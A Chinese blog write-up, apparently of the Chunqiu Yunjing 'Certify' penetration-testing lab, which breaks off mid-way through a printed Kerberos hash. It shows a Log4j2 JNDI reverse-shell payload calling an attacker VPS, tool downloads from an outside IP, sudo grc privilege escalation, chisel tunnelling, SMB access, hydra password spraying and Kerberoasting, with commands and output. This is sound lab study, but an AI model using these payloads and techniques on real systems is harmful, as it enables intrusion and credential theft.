
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>春秋云境 Certify | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#solr-log4j2-jndi"><span class="toc-number">2.</span> <span class="toc-text">solr log4j2 jndi</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#grc%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">grc提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-amp-%E4%BB%A3%E7%90%86"><span class="toc-number">4.</span> <span class="toc-text">信息收集 &amp; 代理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SMB"><span class="toc-number">5.</span> <span class="toc-text">SMB</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92-amp-SPN"><span class="toc-number">6.</span> <span class="toc-text">密码喷洒 &amp; SPN</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ESC1"><span class="toc-number">7.</span> <span class="toc-text">ESC1</span></a></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>春秋云境 Certify</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2025/2/26
        </span>
        
        <span class="category">
            <a href="/blog/categories/%E6%B8%97%E9%80%8F/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                渗透
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/%E6%8F%90%E6%9D%83/" style="color: #00a596">提权</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/JNDI/" style="color: #03a9f4">JNDI</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/SMB/" style="color: #03a9f4">SMB</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/Kerberos/" style="color: #00a596">Kerberos</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/" style="color: #00bcd4">春秋云境</a>
            </span>
            
        </span>
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">1.8k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">9分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最后一点沙砾，打完这个靶场刚好</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/10/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%C2%B7certify/">https://fushuling.com/index.php/2023/10/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%C2%B7certify/</a></p>
<p><a target="_blank" rel="noopener" href="https://bowuchuling.github.io/posts/chunqiuCertify.html">https://bowuchuling.github.io/posts/chunqiuCertify.html</a></p>
<p><a target="_blank" rel="noopener" href="https://exp10it.io/2023/08/chunqiuyunjing-certify-writeup/">https://exp10it.io/2023/08/chunqiuyunjing-certify-writeup/</a></p>
<span id="more"></span>

<hr>
<h1 id="solr-log4j2-jndi"><a href="#solr-log4j2-jndi" class="headerlink" title="solr log4j2 jndi"></a>solr log4j2 jndi</h1><p>访问给的 ip 是个 nginx，fscan 扫一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./fscan <span class="token parameter variable">-h</span> <span class="token number">39.98</span>.119.159<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">39.98</span>.119.159:22
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">39.98</span>.119.159:80
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">39.98</span>.119.159:22 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span>ssh<span class="token punctuation">]</span> 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span> Banner:<span class="token punctuation">[</span>SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.<span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">39.98</span>.119.159:8983
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:21<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">39.98</span>.119.159:80 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span>http<span class="token punctuation">]</span> 版本:1.18.0 产品:nginx 系统:Linux 信息:Ubuntu
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">39.98</span>.119.159:8983 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span>http<span class="token punctuation">]</span> 产品:Apache Solr Banner:<span class="token punctuation">[</span>HTTP/1.1 <span class="token number">302</span> Found.Location: http://172.22.9.19:8983/solr/.<span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 存活端口数量: <span class="token number">3</span>
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 开始漏洞扫描
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 加载的插件: ssh, webpoc, webtitle
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 http://39.98.119.159      状态码:200 长度:612    标题:Welcome to nginx<span class="token operator">!</span>
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:27<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 http://39.98.119.159:8983 状态码:302 长度:0      标题:无标题 重定向地址: http://39.98.119.159:8983/solr/
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:27<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 http://39.98.119.159:8983/solr/ 状态码:200 长度:16555  标题:Solr Admin
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 08:47:33<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 扫描已完成: <span class="token number">5</span>/5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>8983 端口上有个 solr 服务，在依赖里发现 log4j2</p>
<p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226084920658.png" alt="image-20250226084920658"></p>
<p>接下来寻找注入点</p>
<p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226085235545.png" alt="image-20250226085235545"></p>
<p>测试 jndi payload（这个接口抓包重放貌似不行）</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">$<span class="token punctuation">&#123;</span>jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>$<span class="token punctuation">&#123;</span>sys<span class="token operator">:</span>java<span class="token punctuation">.</span>version<span class="token punctuation">&#125;</span><span class="token punctuation">.</span>lazz9x0vcly5xsn3cn6l7798qzwqkg85<span class="token punctuation">.</span>oastify<span class="token punctuation">.</span>com<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226090034789.png" alt="image-20250226090034789"></p>
<p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226090100672.png" alt="image-20250226090100672"></p>
<p>成功读到 jdk 版本</p>
<p>那么用 JNDIExploit 一把梭：<a target="_blank" rel="noopener" href="https://github.com/0x727/JNDIExploit/releases/tag/1.1">https://github.com/0x727/JNDIExploit/releases/tag/1.1</a></p>
<p>vps 上起一个 LDAP 服务</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDIExploit-1.3-SNAPSHOT.jar <span class="token parameter variable">-i</span> VPS_IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>弹shell的payload为</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">$<span class="token punctuation">&#123;</span>jndi<span class="token operator">:</span>ldap<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token constant">VPS_IP</span><span class="token operator">:</span><span class="token number">1389</span><span class="token operator">/</span><span class="token class-name">Basic</span><span class="token operator">/</span><span class="token class-name">ReverseShell</span><span class="token operator">/</span><span class="token constant">VPS_IP</span><span class="token operator">/</span><span class="token number">23333</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226091749330.png" alt="image-20250226091749330"></p>
<p>然后就弹shell了，但是权限太低没找到flag，看来得提权</p>
<h1 id="grc提权"><a href="#grc提权" class="headerlink" title="grc提权"></a>grc提权</h1><p>测试提权小连招走一波</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null

<span class="token function">sudo</span> <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226092440061.png" alt="image-20250226092440061"></p>
<p>发现 grc 命令：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/grc/">https://gtfobins.github.io/gtfobins/grc/</a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> grc <span class="token parameter variable">--pty</span> <span class="token function">cat</span> /root/flag/flag01.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>flag在 &#x2F;root&#x2F;flag&#x2F;flag01.txt</p>
<p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226092801023.png" alt="image-20250226092801023"></p>
<hr>
<h1 id="信息收集-amp-代理"><a href="#信息收集-amp-代理" class="headerlink" title="信息收集 &amp; 代理"></a>信息收集 &amp; 代理</h1><p>wget 下载需要的软件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> grc <span class="token parameter variable">--pty</span> <span class="token function">wget</span> <span class="token number">121.40</span>.34.196:26666/fscan
<span class="token function">sudo</span> grc <span class="token parameter variable">--pty</span> <span class="token function">wget</span> <span class="token number">121.40</span>.34.196:26666/proxy/chisel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>fscan 扫一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./fscan <span class="token parameter variable">-h</span> <span class="token number">172.22</span>.9.19/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetInfo 扫描结果
目标主机: <span class="token number">172.22</span>.9.7
主机名: XIAORANG-DC
发现的网络接口:
   IPv4地址:
      └─ <span class="token number">172.22</span>.9.7
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 http://172.22.9.19        状态码:200 长度:612    标题:Welcome to nginx<span class="token operator">!</span>
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 http://172.22.9.7         状态码:200 长度:703    标题:IIS Windows Server
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetInfo 扫描结果
目标主机: <span class="token number">172.22</span>.9.26
主机名: DESKTOP-CBKTVMO
发现的网络接口:
   IPv4地址:
      └─ <span class="token number">172.22</span>.9.26
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 http://172.22.9.47        状态码:200 长度:10918  标题:Apache2 Ubuntu Default Page: It works
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.9.7      DC:XIAORANG<span class="token punctuation">\</span>XIAORANG-DC    
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server <span class="token number">2016</span> Datacenter <span class="token number">14393</span>
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.9.47     fileserver                          Windows <span class="token number">6.1</span>
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 系统信息 <span class="token number">172.22</span>.9.47 <span class="token punctuation">[</span>Windows <span class="token number">6.1</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> SMB认证成功 <span class="token number">172.22</span>.9.47:445 administrator:123456
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> SMB2共享信息 <span class="token number">172.22</span>.9.47:445 administrator Pass:123456 共享:<span class="token punctuation">[</span>print$ fileshare IPC$<span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 http://172.22.9.19:8983   状态码:302 长度:0      标题:无标题 重定向地址: http://172.22.9.19:8983/solr/
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 目标: http://172.22.9.7:80
  漏洞类型: poc-yaml-active-directory-certsrv-detect
  漏洞名称: 
  详细信息:
        author:AgeloVito
        links:https://www.cnblogs.com/EasonJim/p/6859345.html
<span class="token punctuation">[</span><span class="token number">2025</span>-02-26 09:46:58<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 http://172.22.9.19:8983/solr/ 状态码:200 长度:16555  标题:Solr Admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">172.22</span>.9.7 XIAORANG-DC
<span class="token number">172.22</span>.9.19 Solr
<span class="token number">172.22</span>.9.26 DESKTOP-CBKTVMO
<span class="token number">172.22</span>.9.47 fileserver <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后挂代理</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./chisel server <span class="token parameter variable">-p</span> <span class="token number">33322</span> <span class="token parameter variable">--reverse</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./chisel client vpsip:33322 R:0.0.0.0:44543:socks<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h1><p>先打 172.22.9.47 的 smb 吧</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python3 smbclient.py <span class="token number">172.22</span>.9.47<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226102526279.png" alt="image-20250226102526279"></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">shares
use fileshare<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>flag在 secret&#x2F;flag02.txt 下</p>
<p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226102837858.png" alt="image-20250226102837858"></p>
<p>现在回根目录下载一下 personal.db</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">get personnel.db<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>下载位置就是本地启动的终端所在的文件夹</p>
<p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226104149333.png" alt="image-20250226104149333"></p>
<p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226104118422.png" alt="image-20250226104118422"></p>
<p>有一堆账密，猜测是密码喷洒，比较有可能的就是 172.22.9.26 这台</p>
<h1 id="密码喷洒-amp-SPN"><a href="#密码喷洒-amp-SPN" class="headerlink" title="密码喷洒 &amp; SPN"></a>密码喷洒 &amp; SPN</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> hydra <span class="token parameter variable">-L</span> xr_members.txt <span class="token parameter variable">-P</span> xr_users.txt <span class="token number">172.22</span>.9.26 rdp <span class="token operator">></span> result.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226104927906.png" alt="image-20250226104927906"></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zhangjian:i9XDE02pLVf
liupeng:fiAzGwEMgTY<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>但俩 rdp 都不上去，上面提示说考虑 SPN，试试查找下域用户下的SPN</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python3 GetUserSPNs.py <span class="token parameter variable">-request</span> -dc-ip <span class="token number">172.22</span>.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226105216870.png" alt="image-20250226105216870"></p>
<p>得到了 chenchen 和 zhangxia 的密码哈希</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$krb5tgs</span><span class="token variable">$23</span><span class="token variable">$*</span>zhangxia<span class="token variable">$XIAORANG</span>.LAB<span class="token variable">$xiaorang</span>.lab/zhangxia*<span class="token variable">$088c35eb65f51706e7321bbb47f23218</span><span class="token variable">$fc340e9d698c0def2d4032d0e9457910c42a5f034c14171f365154e8420b2e72953e555f20e5c21b839a039601e46f804cfdaf007aa8773c6a526b936c352d449cc39035a7ce45c57f51b74628adea3c7440631192ed86ce6688cc2b9e0123df73fd8c3c271bb5334d556c63fc8a433b8d8f1a6bdb11f5df91c6dd60dde54617c97550a3e56be64efb5e3a01cc4db26a7194fe936594d858962c58f0d576ab1c996952d468fe74b598e2f07ddd314c3ea6f8dc2b4c6b4f0b3532e81288411f33505dd48041db135a1c23d41de65a2db3f0c5ebcf15e2fb93dff3dab8dcec59fcf3f40f80c59b7b6cb88a96161e65860bd15a0369bd676252a3824d0cd816cde48ee3c587c5cdfe787f39bcf7a63d02811a74a08a018e90871dc3a37ecc6ebac0e035f51b545c9daa1c21ca29c052e65d4401547eb09ce9f644bb83cd1a2e554f8122b7f4dad50ab57596dcbce31ca4a91a84138127224849a86d93fd7998123f1311b675629f85fbf3357d7eb3d7378ba6bf51492a227ad1187d711562de06d92b77f8a56197d4dadef5c10f8c29f2b1278353c964f7636e7f674e7b3203c9cba2dcc6134797cdfd8f9118c7d49fdaaceae530ea7d81893573a85e5a77a749c5ccbabc3a183f0253aab684f8ed3c87ad43b1e4d4cb993369a6ad04db0dab2d2897920d75a75b4aeb5620621ae421c469df6741c6c063ae9ca678c40c2596ba4b133614f6003c54aae9d23a10a4bc92048f8af0c25ba